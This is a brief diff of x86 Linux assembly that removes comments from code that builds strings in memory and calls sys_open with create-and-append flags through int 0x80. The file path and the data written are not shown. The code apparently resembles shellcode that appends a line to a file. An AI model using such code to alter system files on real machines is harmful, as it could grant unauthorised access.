@@ -17,11 +17,11 @@ mov [esi+0x2b],al
 mov byte [esi+0x2a],0xa
 lea ebx,[esi+0xc]
 mov [esi+0x2c],ebx
-lea ebx,[esi]               ; set path to file
-mov cx,0x442                ; set flags
+lea ebx,[esi]
+mov cx,0x442
 mov dx,0x1a4
 mov al,0x5
-int 0x80                    ; sys_open(
+int 0x80
 
 mov ebx,eax
 xor edx,edx
